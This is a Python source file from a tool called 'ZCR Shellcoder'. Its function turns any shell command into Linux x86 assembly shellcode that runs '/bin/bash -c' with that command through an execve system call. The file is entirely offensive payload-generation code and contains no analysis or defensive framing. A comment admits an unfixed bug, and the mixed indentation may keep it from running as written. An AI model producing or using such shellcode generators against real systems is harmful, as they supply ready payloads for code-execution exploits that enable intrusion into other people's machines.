#!/usr/bin/env python
'''
ZCR Shellcoder

ZeroDay Cyber Research
Z3r0D4y.Com
Ali Razmjoo
shellcode template used : http://shell-storm.org/shellcode/files/shellcode-57.php
'''
def run(command):
	command = command.replace('[space]',' ')
        if len(command) < 5: 
		command = str(command) + '    '
	#bug in line 12 & 13, check later 
	m = len(command) - 1
	if len(command) >= 4:
		m = len(command) - 1
		stack = ''
		while(m>=0):
				stack += command[m]
				m -= 1
		stack = stack.encode('hex')
		shr_counter = 0 
		shr_counter = len(stack) % 8
		zshr_counter = shr_counter
		shr = None
		if shr_counter is 2:
			shr = '\npop %ecx\nshr    $0x10,%ecx\nshr    $0x8,%ecx\npush %ecx\n'
			stack = stack[0:2] + '909090' + stack[2:]
		if shr_counter is 4:
			shr = '\npop %ecx\nshr    $0x10,%ecx\npush %ecx\n'
			stack = stack[0:4] + '9090' + stack[4:]
		if shr_counter is 6:
			shr = '\npop %ecx\nshr    $0x8,%ecx\npush %ecx\n'
			stack = stack[0:6] + '90' + stack[6:]
		zshr = shr
		m = len(stack)
		n = len(stack) / 8
		file_shellcode = ''
		shr_counter = len(stack) % 8
		if shr_counter is 0:
			shr_n = 0
			r = ''
			while(n is not 0):
				if shr is not None:
					shr_n += 1
					zx = m - 8
					file_shellcode = 'push $0x' + str(stack[zx:m]) + '\n' + file_shellcode 
					m -= 8
					n = n - 1
					shr = None
				if shr is None:
					shr_n += 1
					zx = m - 8
					file_shellcode =  'push $0x' + str(stack[zx:m]) + '\n' + file_shellcode
					m -= 8
					n = n - 1
					
					
			if zshr is None:
				file_z = file_shellcode
			if zshr is not None:
				rep1 = file_shellcode[:16]
				rep2 = rep1 + zshr
				file_z = file_shellcode.replace(rep1,rep2)
	if len(command) <= 3:
		m = len(command) - 1
		stack = ''
		while(m>=0):
				stack += command[m]
				m -= 1
		content = '0x' + stack.encode('hex')
		if len(content) % 2 is not 0:
			content = content.replace('0x','0x0')
		if len(content) is 8:
			content = content + '90\npop %ecx\nshr $0x8,%ecx\npush %ecx\n'
		if len(content) is 6:
			content = content + '9090\npop %ecx\nshr $0x10,%ecx\npush %ecx\n'
		if len(content) is 4:
			content = content + '909090\npop %ecx\nshr $0x10,%ecx\nshr $0x8,%ecx\npush %ecx\n'
		file_z = 'push $' + content
	shellcode = '''push   $0xb
pop    %%eax
cltd
push   %%edx
%s
mov    %%esp,%%esi
push   %%edx
push   $0x632d9090
pop    %%ecx
shr    $0x10,%%ecx
push   %%ecx
mov    %%esp,%%ecx
push   %%edx
push   $0x68
push   $0x7361622f
push   $0x6e69622f
mov    %%esp,%%ebx
push   %%edx
push   %%edi
push   %%esi
push   %%ecx
push   %%ebx
mov    %%esp,%%ecx
int    $0x80
mov    $0x01,%%al
mov    $0x01,%%bl
int    $0x80
'''%(str(file_z))
	return shellcode
